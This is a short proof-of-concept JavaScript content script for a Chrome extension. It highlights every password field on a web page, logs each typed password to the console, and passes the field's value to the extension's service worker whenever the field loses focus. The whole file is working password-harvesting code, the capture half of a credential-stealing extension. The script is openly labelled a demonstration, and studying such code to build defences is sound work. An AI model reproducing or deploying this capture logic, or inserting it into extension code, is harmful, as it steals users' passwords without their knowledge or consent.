const cs_name = "PoC CONTENT SCRIPT";

console.log(`The best ${cs_name} made by Shannah (no chat j'ai pété): CONTENT SCRIPT script loaded.`);

// Highlight password fields and log access
const highlightFields = () => {
    const passwordFields = document.querySelectorAll('input[type="password"]');
    passwordFields.forEach((field) => {
        field.style.border = "10px solid red";
        field.addEventListener('focus', () => {
            console.log(`${cs_name}: Password field focused.`);
        });
        field.addEventListener('input', () => {
            console.log(`${cs_name}: Password field value updated with: ` + field.value);
        });
        // Event listener for input field not in focus, send the message to the service worker
        field.addEventListener('blur', () => {
            console.log(`${cs_name}: Password field out of focus (it means the user clicked out of the input field).`);
            // Do the message passing to the service worker
            chrome.runtime.sendMessage({type: "password", value: field.value}, (response) => { console.log(response); });
        });
    });
};

highlightFields();